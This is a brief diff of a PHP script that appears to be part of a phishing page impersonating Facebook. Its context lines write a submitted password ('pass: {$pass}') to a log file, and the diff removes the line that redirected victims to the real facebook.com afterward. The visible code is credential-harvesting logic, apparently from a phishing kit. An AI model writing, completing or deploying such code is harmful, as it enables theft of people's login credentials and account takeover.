@@ -9,6 +9,5 @@ fwrite($fp, "pass: {$pass}\n");
 fwrite($fp, "---------------\n");
 fclose($fp);
 
-header('Location: https://facebook.com');
 exit();
 ?>
